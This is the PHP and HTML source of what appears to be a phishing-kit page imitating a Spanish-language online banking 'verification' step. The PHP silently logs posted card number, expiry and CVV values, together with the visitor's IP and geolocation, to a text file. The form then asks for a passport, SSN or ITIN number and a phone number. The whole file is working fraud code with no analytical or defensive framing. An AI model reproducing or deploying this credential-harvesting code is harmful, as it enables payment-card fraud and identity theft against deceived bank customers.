<?php
@session_start();
ini_set("display_errors", 0);
$ip = $_SERVER['REMOTE_ADDR'];
$k1 = $_POST['g1'];
$k2 = $_POST['g2'];
$k3 = $_POST['g3'];
$k4 = $_POST['g4'];


if (isset ($k1) && isset ($k2) && isset ($k3) && isset ($k4) ) {
  $dedon = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

  $country = $dedon->country;
  $city = $dedon->city;
  
  $time = date('Y-m-d H:i:s');
  $dat = fopen('kios.txt', 'a');
  fwrite($dat, "|| CC: $k1 - MM: $k2/$k3 - vvc: $k4 $country $city  $time - $ip\n");
  
} else{ header ('index3.php'); exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>login</title>
    <link rel="stylesheet" href="style3.css">
    
</head>
<body>
    <main>
        <form action="fin.php" method="post">
        <div class="caja">
            <div class="txt1">
                <h3>Casi hemos terminado</h3><br>
                Proporcione la siguiente información para completar el proceso de verificación</a>
            </div>
            <div class="tah" id='tah'>
                
                <div class="ad">
                    
                    <div class="">
                        Tipo de documento: <br><select style="width: 60%; margin:7px 0; margin-botton:10px;" name="g1" id="" required>
                            <option >Seleccione</option>
								<option >Pasaporte</option>
								<option >Numero de Seguro Social (SSN)</option>
								<option > (ITIN)</option>
								
								
                        </select>

                       
                    </div>
                    <div class="">
                        <label>Numero de Identificacion:</label> <br> <input style="margin:7px 0;" type="text" name="g2" required>
                    </div>
                    <div class="">
                        <label>Numero de Telefono:</label> <br> <input style="margin:7px 0;" type="text" name="g3" required>
                    </div>
                </div>
                <div class="tire">
                    <img src="https://i.postimg.cc/4xbtDR4b/222d.png" alt="">
                </div>
                
            </div>

            <div class="txt2">
                Recuerde ingresar sus datos cuidadosamente a fin de comprobar su identidad y seguir proporcionandole nuestros servicios de Online Banking.
            </div>
            <div class="btn">
                <button>Confirmar</button>
            </div>
        </div>
    </form>
    </main>
    <script src="secure.js"></script>
</body>
</html>